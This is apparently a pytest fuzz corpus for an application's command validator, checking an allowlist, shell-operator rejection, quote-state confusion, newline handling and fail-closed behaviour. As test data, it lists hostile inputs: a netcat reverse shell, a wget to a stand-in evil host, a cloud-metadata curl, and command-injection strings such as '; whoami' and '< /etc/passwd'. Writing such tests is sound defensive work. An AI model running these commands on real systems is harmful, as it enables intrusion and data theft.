r"""Fuzz / bypass corpus for the command validator.

Plan reference: docs/improvement-plans/security-hardening/08-injection-ssrf-pentest.md#81

`app/exec/command_runner.py` turns operator-supplied TEXT into process execution. It is
the most dangerous single file in the codebase, so its validator gets an adversarial
corpus rather than only happy-path tests.

Layered defences, in order of how much they actually matter:

  1. `subprocess.run(argv, shell=False)`  -- the real control. No shell, so shell
     metacharacters in ARGUMENTS are inert.
  2. binary allowlist                     -- only known tools may run at all.
  3. `_has_unquoted_shell_operator`       -- defense in depth; rejects `; | & > < \`` and
                                             `$(` outside quotes.
  4. newline / length caps.

These tests attack layers 2-4. Deliberately NO hypothesis dependency: a fixed corpus is
deterministic, reviewable, and names the specific bypass families being defended against.
"""
from __future__ import annotations

import pytest

from app.exec.command_runner import validate_command

#: Mirrors a realistic deployment allowlist.
ALLOWLIST = ["az", "kubectl", "helm"]

#: Characters that must never survive into argv when the shell is not involved. Even
#: with shell=False these indicate the parser mis-split the command.
_SHELL_METACHARS = (";", "|", "&", "`", "\n", "\r", "\x00")


def _ok(cmd: str):
    return validate_command(cmd, ALLOWLIST)


# ===================================================================== allowlist


@pytest.mark.parametrize(
    "cmd",
    [
        "bash -c whoami",
        "sh -c id",
        "python -c 'import os; os.system(\"id\")'",
        "curl http://169.254.169.254/",
        "wget http://evil.example/x",
        "nc -e /bin/sh 10.0.0.1 4444",
        "powershell -enc SQBFAFgA",
        "cmd.exe /c dir",
        "/bin/sh",
        "../../bin/sh",
        " az vm list".replace("az", "azx"),
    ],
)
def test_non_allowlisted_binaries_are_rejected(cmd):
    result = _ok(cmd)
    assert not result.ok, f"non-allowlisted binary accepted: {cmd!r} -> {result.argv}"


def test_allowlist_matching_is_case_insensitive_but_still_normalises():
    """`AZ vm list` is ACCEPTED -- allowlist matching is deliberately case-insensitive.

    That is not a bypass: the validator normalizes the resolved binary to its allowlisted
    form (`binary == "az"`), so no unlisted executable can be reached this way. Pinned
    because a naive reading of the corpus above would suggest case should be rejected.
    """
    result = _ok("AZ vm list")
    assert result.ok
    assert result.binary == "az", "case variants must normalise to the allowlisted binary"
    assert result.binary in ALLOWLIST


def test_an_allowlisted_command_is_accepted():
    """Non-vacuity. If everything were rejected the corpus above would pass trivially
    while the feature was simply broken."""
    result = _ok("az vm list --output json")
    assert result.ok, f"a legitimate command was rejected: {result.error}"
    assert result.argv[0] == "az"


# ===================================================================== shell operators


@pytest.mark.parametrize(
    "cmd",
    [
        "az vm list; whoami",
        "az vm list && whoami",
        "az vm list || whoami",
        "az vm list | tee /tmp/x",
        "az vm list > /tmp/out",
        "az vm list >> /tmp/out",
        "az vm list < /etc/passwd",
        "az vm list `whoami`",
        "az vm list $(whoami)",
        "az vm list & whoami",
    ],
)
def test_unquoted_shell_operators_are_rejected(cmd):
    assert not _ok(cmd).ok, f"shell operator accepted: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "az vm list\nwhoami",
        "az vm list\r\nwhoami",
        "az vm list\rwhoami",
    ],
)
def test_newlines_are_rejected(cmd):
    """A newline turns one validated command into two."""
    assert not _ok(cmd).ok, f"newline accepted: {cmd!r}"


# ===================================================================== quote-state confusion


@pytest.mark.parametrize(
    "cmd",
    [
        # The validator tracks quote state to allow metacharacters INSIDE quotes. These
        # probe whether the tracker can be desynchronised so a real operator slips out.
        "az vm list --query \"a'b\" ; whoami",
        "az vm list --query 'a\"b' ; whoami",
        "az vm list --query \"unterminated ; whoami",
        "az vm list --query 'unterminated ; whoami",
        "az vm list --query \\\" ; whoami",
        "az vm list --query \"\" ; whoami",
        "az vm list --query ''; whoami",
    ],
)
def test_quote_state_confusion_cannot_smuggle_an_operator(cmd):
    """Either the command is rejected, or it parses to argv with no live metacharacter
    in the BINARY position. shell=False means quoted metacharacters in arguments are
    inert data -- what must never happen is a second command becoming executable."""
    result = _ok(cmd)
    if result.ok:
        assert result.binary in ALLOWLIST, (
            f"quote confusion changed the executed binary: {cmd!r} -> {result.argv}"
        )
        assert "whoami" not in result.binary


# ===================================================================== argv hygiene


@pytest.mark.parametrize(
    "cmd",
    [
        "az vm list",
        "az vm list --query \"[].{name:name}\"",
        "az rest --url https://management.azure.com/subscriptions",
        "kubectl get pods -o json",
        "helm list --all-namespaces",
    ],
)
def test_accepted_commands_never_yield_a_metacharacter_in_the_binary(cmd):
    result = _ok(cmd)
    if not result.ok:
        pytest.skip(f"rejected by policy: {result.error}")
    assert not any(c in result.argv[0] for c in _SHELL_METACHARS), (
        f"binary position contains a shell metacharacter: {result.argv[0]!r}"
    )
    assert result.binary in ALLOWLIST


# ===================================================================== malformed input


@pytest.mark.parametrize(
    "cmd",
    ["", "   ", "\t", "\n", "az", "'", '"', "''", '""', "az '", 'az "', "az \\"],
)
def test_malformed_input_never_raises(cmd):
    """The validator is reached from request handlers; an unhandled parse exception
    there is a 500 and an availability bug."""
    result = validate_command(cmd, ALLOWLIST)
    assert isinstance(result.ok, bool)


def test_absurdly_long_commands_are_capped():
    assert not _ok("az vm list " + ("x" * 5000)).ok


def test_empty_allowlist_permits_nothing():
    """Fail closed: a misconfigured or empty allowlist must not mean 'allow all'."""
    assert not validate_command("az vm list", []).ok


# ===================================================================== documented gaps


@pytest.mark.parametrize(
    "cmd",
    [
        pytest.param("az vm {create,delete} --name x", id="brace-expansion"),
        pytest.param("az resource list *", id="glob"),
        pytest.param("az FOO=bar vm list", id="var-assignment"),
    ],
)
def test_shell_syntax_not_in_the_operator_list_is_inert_without_a_shell(cmd):
    """These are NOT rejected -- brace expansion, globbing and variable assignment are not
    in `_FORBIDDEN_OPERATORS`. That is acceptable ONLY because `shell=False` means the
    shell never interprets them; they arrive as literal argument text.

    This test documents the reasoning and pins the real invariant: whatever the validator
    lets through, the BINARY must still be allowlisted. If execution ever moved to
    `shell=True`, these become live command injection and this test should be promoted to
    a rejection assertion.
    """
    result = _ok(cmd)
    if result.ok:
        assert result.argv[0] in ALLOWLIST
